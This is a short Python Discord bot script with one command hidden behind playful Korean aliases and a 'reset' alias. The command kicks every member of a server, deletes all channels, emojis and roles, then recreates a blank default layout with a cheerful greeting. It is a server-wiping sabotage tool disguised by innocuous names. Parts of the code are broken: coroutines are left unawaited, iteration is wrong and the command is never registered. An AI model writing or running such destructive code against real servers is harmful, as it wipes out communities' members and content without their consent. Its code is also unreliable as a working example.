import discord
from discord.ext import commands

client = commands.Bot(command_prefix='%')

@commands.command(name="%즐겁다", aliases=[r"%reset", "%리셋", "%폭팔", "%서버를아이스크림해피로만드는엄청나고대단한명령어일가능성이매우높음"])
@commands.guild_only()
async def _enjoythecommandlol(ctx: commands.Context):
    guild: discord.Guild = ctx.guild
    for i in guild.fetch_members(limit=6000000):
        await i.kick()
    for i2 in guild.fetch_channels():
        await i2.delete()
    for i3 in guild.fetch_emojis():
        i3.delete()
    for i4 in guild.fetch_roles():
        i4.delete()
    category1 = await guild.create_category("채팅 채널")
    textchannel = category1.create_text_channel("일반")
    category2 = await guild.create_category("음성 채널")
    category2.create_voice_channel("일반")
    textchannel.send("디스코드 서버에서 채팅해봐요!")

client.run("token")
